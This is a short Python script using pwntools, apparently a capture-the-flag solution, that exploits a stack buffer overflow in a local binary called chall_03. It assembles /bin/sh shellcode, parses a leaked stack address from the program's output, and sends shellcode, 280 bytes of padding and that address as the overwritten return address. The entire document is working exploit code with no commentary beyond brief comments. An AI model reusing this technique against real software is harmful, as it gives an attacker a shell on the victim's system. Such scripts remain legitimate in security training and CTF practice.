from pwn import *

# Set the architecture and load the binary
context.arch = "amd64"
elf = ELF("./chall_03")

# Generate shellcode
shellcode_data = asm(shellcraft.sh())
shellcode_length = len(shellcode_data)

# Start the process
p = process("./chall_03")

# Receive the initial output
p.recvuntil(b':) ')

# Retrieve leaked address
leak_data = p.recv()
stack_address = int(leak_data[-15:], 16)

# Craft the payload
exploit_payload = shellcode_data + b's' * 280 + p64(stack_address)

# Send the payload
p.sendline(exploit_payload)
